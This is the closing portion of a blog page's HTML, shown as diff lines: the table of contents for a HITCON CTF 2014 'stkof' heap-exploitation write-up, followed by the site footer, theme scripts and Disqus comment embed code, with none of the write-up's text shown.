+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#准备工作"><span class="nav-number">1.</span> <span class="nav-text">准备工作</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#unlink"><span class="nav-number">2.</span> <span class="nav-text">unlink</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#另外的overwrite目标"><span class="nav-number">3.</span> <span class="nav-text">另外的overwrite目标</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2017 &mdash; <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">giantbranch</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.3</div>
+
+
+
+
+<div class="footer-custom">
+<!-- <a href="https://beian.miit.gov.cn/">粤ICP备16051028号-1</a> -->
+<br>
+这是我的新博客，网站建于2017年10月
+<!-- <br>以下UV,PV统计始于2018.06.23 -->
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+    
+      <script id="dsq-count-scr" src="https://giantbranch.disqus.com/count.js" async></script>
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'https://www.giantbranch.cn/2017/12/04/HITCON CTF 2014 stkof/';
+          this.page.identifier = '2017/12/04/HITCON CTF 2014 stkof/';
+          this.page.title = 'HITCON CTF 2014 stkof';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://giantbranch.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
